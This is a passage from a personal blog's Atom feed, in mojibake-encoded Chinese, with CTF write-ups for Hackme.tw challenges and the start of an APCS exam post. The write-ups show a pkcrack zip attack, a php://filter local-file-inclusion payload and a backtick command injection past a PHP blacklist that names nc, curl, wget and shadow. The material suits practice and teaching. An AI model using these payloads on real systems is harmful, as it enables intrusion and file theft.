çµèª</h2><p>åŸæœ¬æ˜¯å‰›å­¸åˆ°ropçš„æ¦‚å¿µï¼Œæƒ³è¦æ‹¿é¡Œç›®ä¾†ç·´ç¿’ï¼Œæ‰¾è‘—æ‰¾è‘—æ‰¾åˆ°é€™é¡Œï¼Œè¦ºå¾—åšæ³•å¾ˆæœ‰è¶£å°±è¨˜éŒ„ä¸‹ä¾†äº†w</p><p>æˆåŠŸget shellçš„æ™‚å€™ç¸½æ˜¯å¾ˆé–‹å¿ƒå‘¢w (ï¾‰âˆ€`*)</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;å› ç‚ºå–œæ­¡ä¸ŠPwnæ‰€ä»¥æƒ³è¦åŠ å¼·å¯¦åŠ›ï¼Œç„¶å¾Œå°±åœ¨ç¶²è·¯ä¸Šæ‰¾æ‰¾å¤é¡Œä¾†è§£ï¼Œå¸Œæœ›å¯ä»¥å­¸åˆ°é»æ±è¥¿!&lt;/p&gt;
&lt;p&gt;åœ¨ç¶²è·¯ä¸Šæ‰¾åˆ°äº†é€™é¡ŒAIS3-2017çš„é¡Œç›®ï¼ŒPwn-endã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://twinklestar03.com/categories/CTF/"/>
    
    
    <category term="AIS3-2017" scheme="https://twinklestar03.com/tags/AIS3-2017/"/>
    
    <category term="Pwn" scheme="https://twinklestar03.com/tags/Pwn/"/>
    
    <category term="Writeup" scheme="https://twinklestar03.com/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>Hackme.tw::è§£é¡Œéç¨‹(é€²åº¦:Web-0x05)</title>
    <link href="https://twinklestar03.com/Contest/CTF/Hackme-tw_Writeup/"/>
    <id>https://twinklestar03.com/Contest/CTF/Hackme-tw_Writeup/</id>
    <published>2019-06-23T16:00:00.000Z</published>
    <updated>2020-12-18T07:36:09.884Z</updated>
    
    <content type="html"><![CDATA[<p>ç‚ºäº†ç·´ç¿’CTFç›¸é—œçŸ¥è­˜ï¼Œæ‰€ä»¥åˆ°äº†é€™å€‹ç¶²ç«™ä¸Šä¾†ç©ï¼Œæœƒæ…¢æ…¢çš„æ›´æ–°è§£é¡Œæ€è·¯è®“è‡ªå·±æœ‰é»å›é¥‹~</p><a id="more"></a><p><a href="https://hackme.inndy.tw/">ç¶²ç«™åœ¨é€™é‚Š&gt;~&lt;</a></p><p>æœªä¾†ä¸€ç›´æ›´æ–°ä¸‹å»çš„è©±æ–‡ç« æœƒå¾ˆé•·å¾ˆé•·ï¼Œå¦‚æœæƒ³è¦é‡å°æŸä¸€é¡Œæˆ–æ˜¯é¡åˆ¥çš„è©±é›»è…¦æ¿ç¶²ç«™å·¦å´æœ‰æ–‡ç« ç›®éŒ„å¯ä»¥æŒ‰!</p><hr><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><hr><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><blockquote><p>All flags are in this format: FLAG{XXXXXXXXX}</p></blockquote><p>å¦‚é¡Œç›®æ•˜è¿°æ‰€ç¤ºXDD</p><hr><h2 id="corgi-can-fly"><a href="#corgi-can-fly" class="headerlink" title="corgi can fly"></a>corgi can fly</h2><blockquote><p>Corgi is cute, right?</p></blockquote><p>ä¸çŸ¥é“è©²åšç”šéº¼çš„æ™‚å€™...<code>hexdump -C</code>!!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">000cb150  61 6e 20 46 6c 79 dc 8d  04 1e 00 00 00 23 74 45  |an Fly.......#tE|</span><br><span class="line">000cb160  58 74 41 72 74 69 73 74  00 52 47 6c 6b 49 48 6c  |XtArtist.RGlkIHl|</span><br><span class="line">000cb170  76 64 53 42 30 63 6d 6c  6c 5a 43 42 4d 55 30 49  |vdSB0cmllZCBMU0I|</span><br><span class="line">000cb180  2f 43 67 3d 3d d1 5a 87  ea 00 00 00 00 49 45 4e  |&#x2F;Cg&#x3D;&#x3D;.Z......IEN|</span><br><span class="line">000cb190  44 ae 42 60 82                                    |D.B&#96;.|</span><br></pre></td></tr></table></figure><p>åœ¨çµå°¾æœ‰çœ‹åˆ°base64ç·¨ç¢¼éçš„ç·¨ç¢¼ï¼Œç‰¹å¾µæ‡‰è©²å°±æ˜¯é‚£å…©å€‹<code>==</code>ï¼Œæ‹¿å»base64 decodeä¸€ä¸‹å§~<br><code>RGlkIHlvdSB0cmllZCBMU0ICg==</code> =&gt; <code>Did you tried LSB</code><br>ä¸çŸ¥é“ç”šéº¼æ˜¯LSBï¼Œå…ˆGoogleä¸€ä¸‹å§ï¼ŒæŸ¥åˆ°äº†LSBæ˜¯ä¸€ç¨®å¯ä»¥åœ¨åœ–ç‰‡ä¸­éš±å¯«çš„æŠ€å·§ï¼Œé€™æ™‚å€™å°±ä¾†æ‰¾å·¥å…·å§!</p><p>é€™é‚Šä½¿ç”¨äº†<strong>stegsolve</strong>ï¼Œä¸€ç¨®åœ–ç‰‡è§£ç¢¼å™¨å§(?ã€‚ ç¸½ä¹‹é»é–‹ä¾†loadåœ–ç‰‡é€²å»ç„¶å¾Œguié»ä¸€é»å°±æœƒå¾—åˆ°ä¸€å€‹QRcodeï¼Œæƒä¸€ä¸‹ç­”æ¡ˆå°±å‡ºä¾†äº†!!</p><hr><h2 id="television"><a href="#television" class="headerlink" title="television"></a>television</h2><blockquote><p>Looks like my television was broken</p></blockquote><p>é€™ä¸€é¡Œä¸€é–‹å§‹æœƒæ‹¿åˆ°ä¸€å€‹<code>.bmp</code>çš„æª”æ¡ˆï¼Œæ‰€ä»¥æˆ‘å°±æ•²äº†<code>bmp file encryption</code>é€²å»äº†googleï¼Œå¾—åˆ°äº†ä¸€å€‹å¯èƒ½çš„ç­”æ¡ˆ: CBC Encryptedï¼Œå› ç‚ºè¢«é€™ç¨®åŠ å¯†éå¾Œçš„bmpåœ–ç‰‡è·Ÿé¡Œç›®çµ¦å‡ºä¾†çš„é•·çš„å·®ä¸å¤šï¼Œçµæœå¥½åƒä¸æ˜¯â€¦.</p><p>æ‰€ä»¥æˆ‘ç”¨äº†<code>strings</code>è§€å¯Ÿä¸€ä¸‹æª”æ¡ˆâ€¦.</p><p>Flagç›´æ¥å°±åœ¨è£¡é¢äº†XDD</p><hr><h2 id="meow"><a href="#meow" class="headerlink" title="meow"></a>meow</h2><blockquote><p>Pusheen is cute!</p></blockquote><p>é€™æ¬¡æ‹¿åˆ°äº†ä¸€å€‹<code>.png</code>æª”æ¡ˆï¼Œ<code>binwalk</code>èµ°èµ·çœ‹çœ‹è£¡é¢è—äº†ç”šéº¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">binwalk meow.png</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             PNG image, 296 x 279, 8-bit&#x2F;color RGBA, non-interlaced</span><br><span class="line">41            0x29            Zlib compressed data, compressed</span><br><span class="line">48543         0xBD9F          Zip archive data, at least v1.0 to extract, name: meow&#x2F;</span><br><span class="line">48606         0xBDDE          Zip archive data, encrypted at least v2.0 to extract, compressed size: 51, uncompressed size: 47, name: meow&#x2F;flag</span><br><span class="line">48740         0xBE64          Zip archive data, at least v1.0 to extract, name: meow&#x2F;t39.1997-6&#x2F;</span><br><span class="line">48814         0xBEAE          Zip archive data, at least v1.0 to extract, name: meow&#x2F;t39.1997-6&#x2F;p296x100&#x2F;</span><br><span class="line">48897         0xBF01          Zip archive data, encrypted at least v2.0 to extract, compressed size: 48404, uncompressed size: 48543, name: meow&#x2F;t39.1997-6&#x2F;p296x100&#x2F;10173502_279586372215628_1950740854_n.png</span><br><span class="line">97912         0x17E78         End of Zip archive, footer length: 22</span><br></pre></td></tr></table></figure><p>æ©â€¦çœ‹èµ·ä¾†æœ‰.zipè—åœ¨è£¡é¢å‘¢w æ€éº¼æŠŠå®ƒæŒ–å‡ºä¾†å‘¢ï¼Œä½¿ç”¨<code>foremost</code>ä¸€å€‹æª”æ¡ˆé‚„åŸå·¥å…·!<br>ä¹‹å¾Œæœƒç”¢å‡ºä¸€å€‹outputè³‡æ–™å¤¾ï¼Œè£¡é¢æœ‰å‰›å‰›çš„<code>00000094.zip</code>é‚„é¡å¤–æ‹¿åˆ°ä¸€å€‹<code>00000000.png</code>ï¼Œ</p><p>ç¸½ä¹‹å…ˆ<code>unzip 00000094.zip</code>....</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Archive:  00000094.zip</span><br><span class="line">[00000094.zip] meow&#x2F;flag password:</span><br></pre></td></tr></table></figure><p>çœ‹èµ·ä¾†è·Ÿæˆ‘è¦å¯†ç¢¼ï¼Œ<del>æˆ‘å»å“ªè£¡ç”Ÿå‡ºä¾†XDD</del><br>å…ˆåˆ†æçœ‹çœ‹é€™å€‹æ‹†å‡ºä¾†çš„<code>.zip</code>å§ï¼Œ<code>unzip -v</code>èµ°èµ·!!(<strong>unzip -v: list verbosely/show version info</strong>)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">unzip -v 00000094.zip</span><br><span class="line">Archive:  00000094.zip</span><br><span class="line"> Length   Method    Size  Cmpr    Date    Time   CRC-32   Name</span><br><span class="line">--------  ------  ------- ---- ---------- ----- --------  ----</span><br><span class="line">       0  Stored        0   0% 2016-06-11 17:22 00000000  meow&#x2F;</span><br><span class="line">      47  Defl:N       39  17% 2016-06-11 17:22 3046cea4  meow&#x2F;flag</span><br><span class="line">       0  Stored        0   0% 2016-06-11 17:20 00000000  meow&#x2F;t39.1997-6&#x2F;</span><br><span class="line">       0  Stored        0   0% 2016-06-11 17:21 00000000  meow&#x2F;t39.1997-6&#x2F;p296x100&#x2F;</span><br><span class="line">   48543  Defl:N    48392   0% 2014-05-14 06:59 cdad52bd  meow&#x2F;t39.1997-6&#x2F;p296x100&#x2F;10173502_279586372215628_1950740854_n.png</span><br><span class="line">--------          -------  ---                            -------</span><br><span class="line">   48590            48431   0%                            5 files</span><br></pre></td></tr></table></figure><p>é€™è£¡é ­ä¹Ÿæœ‰ä¸€å€‹.pngè€¶ï¼Œä»–çš„CRC32: cdad52bdï¼ŒæŠŠå‰›å‰›æ‹›å–šå‡ºä¾†çš„<code>00000000.png</code>æ¯”è¼ƒCRC32çœ‹çœ‹â€¦.<strong>ä¸€è‡´è€¶!</strong></p><p>é€™æ¨£çš„è©±é€™å€‹ <strong>zipå­˜åœ¨è‘—æ˜æ–‡æ”»æ“Š(known plain text attack)</strong> çš„! <strong><code>pkcrack</code>èµ°èµ·!!</strong><br>å¦‚æœè¦åŸ·è¡Œé€™å€‹æ”»æ“Šæ–¹å¼çš„è©±è¦<strong>æŠŠå·²çŸ¥çš„éƒ¨åˆ†è£½ä½œæˆzip file</strong>ï¼Œå†ä½¿ç”¨pkcrackå·¥å…·(ä¹‹å¾Œä¾†ç ”ç©¶åŸç†å†åšå€‹æ–‡ç« ä»‹ç´¹)ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">zip plain.zip 00000000.png&#96;</span><br><span class="line">pkcrack -C 00000094.zip  -c meow&#x2F;t39.1997-6&#x2F;p296x100&#x2F;10173502_279586372215628_1950740854_n.png -P plain.zip  -p ..&#x2F;png&#x2F;00000000.png -d resu</span><br><span class="line">lt.zip -a</span><br><span class="line">unzip result.zip</span><br><span class="line">cat meow&#x2F;flag</span><br></pre></td></tr></table></figure><p>é€™å€‹èŠ±å¥½å¤šå¿ƒåŠ›å†ææ‡‚zipè·Ÿä¸€äº›å·¥å…·ï¼ŒèŠ±äº†ä¸å°‘æ™‚é–“ä½†æ˜¯æ”¶ç©«å¤šå¤š!d(`ï½¥âˆ€ï½¥)b</p><hr><h2 id="where-is-flag"><a href="#where-is-flag" class="headerlink" title="where is flag"></a>where is flag</h2><blockquote><p>Do you know regular expression? </p></blockquote><p>TBD</p><hr><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><hr><h2 id="hide-and-seek"><a href="#hide-and-seek" class="headerlink" title="hide and seek"></a>hide and seek</h2><blockquote><p>Can you see me? Iâ€™m so close to you but you canâ€™t see me.</p></blockquote><p>å°è‘—Hackme.twçš„é¦–é <code>Ctrl + U</code> &amp; <code>Ctrl + F</code>è¼¸å…¥FLAGï¼Œè¹¦!</p><hr><h2 id="guestbook"><a href="#guestbook" class="headerlink" title="guestbook"></a>guestbook</h2><blockquote><p>This guestbook sucks. sqlmap is your friend.</p></blockquote><p>TBD</p><hr><h2 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h2><blockquote><p>What this adminâ€™s password? That is not important at all, just get the flag.<br>Tips: LFI, php://filter</p></blockquote><p>é€™é¡Œæˆ‘ç™¼ç¾æœ‰å…©æ¢è·¯å¯ä»¥èµ°ï¼Œéƒ½å¯ä»¥æ‹¿åˆ°Flagï¼Œ<strong>å…©æ¢è·¯çš„æ”»æ“Šæ–¹æ³•éƒ½æ˜¯Local File Inclusion Attack</strong>åªæ˜¯ä¸€å€‹æ˜¯æ‰“<code>/login</code>ä¸€å€‹æ˜¯çŒœçš„ï¼Œé–‹å§‹å›‰(ã‚âˆ€ï½¥)</p><p>æˆ‘å€‘ä¸€é–‹å§‹å¯ä»¥çœ‹åˆ°ç¶²å€<code>https://hackme.inndy.tw/lfi/?page=pages/index</code>ä½¿ç”¨äº†<code>?page</code>ä¾†å–å¾—è³‡æºï¼Œä½†æ˜¯å¦‚æœç›´æ¥æ”¹æ‰ç¶²å€è½‰å‘åˆ°å…¶ä»–åœ°æ–¹æœƒå‡ºç¾ä¸€å€‹è¨Šæ¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">H@cK3r F0UnD</span><br></pre></td></tr></table></figure><p>é€™å¾ˆæ˜é¡¯ä¸æ˜¯æˆ‘å€‘è¦çš„ï¼Œåœ¨é¡Œç›®çš„æç¤ºé‚„çµ¦å‡ºäº†<code>php://filter</code>é€™å€‹æç¤ºï¼Œæ‡‰è©²æ˜¯å¸Œæœ›æˆ‘å€‘ä½¿ç”¨é€™å€‹æ±è¥¿ä¾†bypassæ‰ç¶²å€ä¿è­·ï¼ŒæŠŠå…§å®¹ç”¨base64 encodeä¹‹å¾Œè¼¸å‡º<code>php://filter/read=convert.base64-encode/resource=</code></p><p>æŠŠç¶²å€æ”¹æˆ<code>https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/flag</code>ä¾†å­˜å–ç¶²é åŸå§‹ç¢¼(flag.phpæ˜¯çŒœçš„)</p><p>å¾—åˆ°ä¸€ä¸²Base64ï¼Œæ‰¾å€‹å·¥å…·decodeå¾—å‡º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Can you read the flag&lt;?php require(&#39;config.php&#39;); ?&gt;?</span><br></pre></td></tr></table></figure><p>é‚„çœŸçš„æœ‰æ±è¥¿ï¼Œé‚£å°±è®€ä»–çš„<code>config.php</code>å§! Flagå°±åœ¨è£¡é¢</p><hr><h2 id="homepage"><a href="#homepage" class="headerlink" title="homepage"></a>homepage</h2><blockquote><p>Where is the flag? Did you check the code?</p></blockquote><p>åœ¨é¦–é ä½¿ç”¨<code>F12</code>ç„¶å¾Œé€²åˆ°console tabï¼Œæœ‰å€‹QRCodeXD</p><hr><h2 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h2><blockquote><p>Can you ping 127.0.0.1?</p></blockquote><p>ä¸€é»é€²å»å°±æœƒå‡ºç¾ä¸€å€‹ç¶²é æœ‰textboxè·Ÿbuttonï¼Œè€Œä¸”ä¸€é–‹å§‹å°±æŠŠphp source codeåå‡ºä¾†äº†ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Ping&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;.&quot;</span> method=<span class="string">&quot;GET&quot;</span>&gt;</span><br><span class="line">        IP: &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;ip&quot;</span>&gt; &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Ping&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;pre&gt;<span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$blacklist</span> = [</span><br><span class="line">            <span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;nc&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;cp&#x27;</span>, <span class="string">&#x27;touch&#x27;</span>, <span class="string">&#x27;mv&#x27;</span>, <span class="string">&#x27;rm&#x27;</span>, <span class="string">&#x27;ps&#x27;</span>, <span class="string">&#x27;top&#x27;</span>, <span class="string">&#x27;sleep&#x27;</span>, <span class="string">&#x27;sed&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;apt&#x27;</span>, <span class="string">&#x27;yum&#x27;</span>, <span class="string">&#x27;curl&#x27;</span>, <span class="string">&#x27;wget&#x27;</span>, <span class="string">&#x27;perl&#x27;</span>, <span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;zip&#x27;</span>, <span class="string">&#x27;tar&#x27;</span>, <span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;ruby&#x27;</span>, <span class="string">&#x27;kill&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;passwd&#x27;</span>, <span class="string">&#x27;shadow&#x27;</span>, <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;z&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;dir&#x27;</span>, <span class="string">&#x27;dd&#x27;</span>, <span class="string">&#x27;df&#x27;</span>, <span class="string">&#x27;du&#x27;</span>, <span class="string">&#x27;free&#x27;</span>, <span class="string">&#x27;tempfile&#x27;</span>, <span class="string">&#x27;touch&#x27;</span>, <span class="string">&#x27;tee&#x27;</span>, <span class="string">&#x27;sha&#x27;</span>, <span class="string">&#x27;x64&#x27;</span>, <span class="string">&#x27;g&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;xargs&#x27;</span>, <span class="string">&#x27;PATH&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;$0&#x27;</span>, <span class="string">&#x27;proc&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&quot;\n&quot;</span></span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        set_time_limit(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">ping</span>(<span class="params"><span class="variable">$ip</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$blacklist</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(strlen(<span class="variable">$ip</span>) &gt; <span class="number">15</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;IP toooooo longgggggggggg&#x27;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">foreach</span>(<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$keyword</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(strstr(<span class="variable">$ip</span>, <span class="variable">$keyword</span>)) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">&quot;<span class="subst">&#123;$keyword&#125;</span> not allowed&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$ret</span> = [];</span><br><span class="line">                exec(<span class="string">&quot;ping -c 1 \&quot;<span class="subst">&#123;$ip&#125;</span>\&quot; 2&gt;&amp;1&quot;</span>, <span class="variable">$ret</span>);</span><br><span class="line">                <span class="keyword">return</span> implode(<span class="string">&quot;\n&quot;</span>, array_slice(<span class="variable">$ret</span>, <span class="number">0</span>, <span class="number">10</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]))</span><br><span class="line">            <span class="keyword">echo</span> htmlentities(ping(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]));</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="meta">?&gt;</span>&lt;/pre&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>æˆ‘å€‘å¯ä»¥è§€å¯Ÿåˆ°å‰é¢æœ‰å€‹blacklistï¼Œçœ‹èµ·ä¾†æ˜¯ç”¨ä¾†é¿å…textboxå‡ºç¾é€™äº›æ±è¥¿ï¼Œç¹¼çºŒå¾€ä¸‹å°±æœƒçœ‹åˆ°æœ‰å€‹<code>exec()</code>çš„functionï¼Œæˆ‘å€‘æ‡‰è©²å¯ä»¥é€écommand injectionä¾†æ‹¿flag</p><p>ä½†æ˜¯ä¸èƒ½ç›´æ¥å¯«æŒ‡ä»¤ä¸Šå»ï¼Œè¦å…ˆæŠŠä¹‹å‰çš„pingéš”é–‹ï¼Œä½†æ˜¯å¤§å¤šæ•¸çš„ç¬¦è™Ÿéƒ½è¢«ç¦æ­¢äº†ï¼Œå¥½ä½³åœ¨**â€`(åæ–œç·š)â€**æ²’æœ‰è¢«ç¦æ­¢ï¼Œè€Œä¸”<code>ls</code>ä¹Ÿæ²’æœ‰è¢«ç¦æ­¢ï¼Œæˆ‘å€‘å…ˆè©¦è©¦çœ‹<code>åæ–œç·šlsåæ–œç·š</code>å§!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ping: flag.php</span><br><span class="line">index.php: Name or service not known</span><br></pre></td></tr></table></figure><p>çœ‹èµ·ä¾†æœ‰å€‹<code>flag.php</code>çš„æª”æ¡ˆï¼Œä½†æ˜¯æˆ‘å€‘ä¸èƒ½ä½¿ç”¨<code>cat</code>ä¹Ÿä¸èƒ½å¯«è…³æœ¬è®“ä»–è·‘ï¼Œä½†å…¶å¯¦é‚„æœ‰<code>sort</code>å¯ä»¥ç”¨ï¼Œè©¦è©¦çœ‹<code>sort flag.php</code>!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag not allowed</span><br></pre></td></tr></table></figure><p>å°è€¶ï¼Œflagä¹Ÿåœ¨blacklistè£¡é¢ï¼Œæˆ‘å€‘é‚„æœ‰ä¸€ç¨®å·¥å…·ï¼Œå«åšwildcard<code>?</code>ï¼Œé‚£æŠŠè¼¸å…¥æ”¹æˆ<code>sort ????????</code>å°±æœƒåflagå‡ºä¾†äº†!</p><p>çœ‹èµ·ä¾†blacklistæ²’æœ‰ç¦æ­¢<code>grep</code>ä¹‹å¾Œå†ä¾†è©¦è©¦çœ‹èƒ½ä¸èƒ½ç”¨grepåflagã€‚</p><hr><h2 id="scoreboard"><a href="#scoreboard" class="headerlink" title="scoreboard"></a>scoreboard</h2><blockquote><p>DO NOT ATTACK or SCAN scoreboard, you donâ€™t need to do that.</p></blockquote><p>Flagåœ¨response headerè£¡é¢ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;ç‚ºäº†ç·´ç¿’CTFç›¸é—œçŸ¥è­˜ï¼Œæ‰€ä»¥åˆ°äº†é€™å€‹ç¶²ç«™ä¸Šä¾†ç©ï¼Œæœƒæ…¢æ…¢çš„æ›´æ–°è§£é¡Œæ€è·¯è®“è‡ªå·±æœ‰é»å›é¥‹~&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://twinklestar03.com/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://twinklestar03.com/tags/CTF/"/>
    
    <category term="Hackme.tw" scheme="https://twinklestar03.com/tags/Hackme-tw/"/>
    
  </entry>
  
  <entry>
    <title>APCS-201906::è§£é¡Œéç¨‹</title>
    <link href="https://twinklestar03.com/Contest/APCS/APCS-20190615/"/>
    <id>https://twinklestar03.com/Contest/APCS/APCS-20190615/</id>
    <published>2019-06-14T16:00:00.000Z</published>
    <updated>2020-12-18T07:36:15.271Z</updated>
    
    <content type="html"><![CDATA[<p>APCSåˆæŒ‘æˆ°(ï½¥Ï‰Â´ï½¥ )<br>è£¸è€ƒä¸Šé™£æ¸¬è©¦è‡ªå·±çš„å¯¦åŠ›æ‰€åœ¨<del>å…¶å¯¦æ˜¯å¤ªé«˜ä¼°è‡ªå·±</del><br>æ²’æ„å¤–çš„è©±æ‡‰è©²æ˜¯æ¦‚å¿µé¡Œ4ç´šåˆ†ã€å¯¦ä½œé¡Œ3ç´šåˆ†~</p><p>ä»¥ä¸‹æ˜¯é¡Œç›®çš„Writeup(`ãƒ»Ï‰ãƒ»Â´)ï¼Œé›–ç„¶åœ¨ç¾å ´æ²’æœ‰å…¨éƒ¨å¯«å‡ºä¾†ä¸éé‚„æ˜¯è¦æœ‰è¤‡ç¿’çš„å¥½ç¿’æ…£!<br>å¯èƒ½å¯«å¾—å¾ˆç³Ÿï¼Œå¦‚æœæœ‰æ›´å¥½çš„å»ºè­°å¯ä»¥é€éç¤¾äº¤è»Ÿé«”è¯çµ¡æˆ‘èªªèªªä½ çš„æƒ³æ³•!</p><a id="more"></a><h1 id="Write-up"><a href="#Write-up" class="headerlink" title="Write-up"></a>Write-up</h1><hr><h2 id="çƒéšŠè¨ˆåˆ†"><a href="#çƒéšŠè¨ˆåˆ†" class="headerlink" title="çƒéšŠè¨ˆåˆ†"></a>çƒéšŠè¨ˆåˆ†</h2><p><a href="/images/APCS/20190615/P1.pdf">é»æˆ‘é–±è®€é¡Œç›®</a></p><p>ä¸€å€‹è »ç°¡å–®çš„é¡Œç›®ï¼Œé¡Œç›®æœ‰4è¡Œè¼¸å…¥ã€æ¯è¡Œæœ‰4å€‹æ•¸å­—ä»£è¡¨è©²å±€å¾—åˆ†ï¼Œ1ã€3è¡Œæ˜¯ä¸»éšŠå¾—åˆ†ï¼Œ2ã€4è¡Œæ˜¯å®¢éšŠå¾—åˆ†ï¼Œæ±‚ä¸Šä¸‹åŠå ´çš„ç¸½åˆ†è·Ÿèª°ç²å‹(Winã€Loseã€Tie)ã€‚</p><figure class="highlight cpp"><figcaption><span>P1.cpp</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 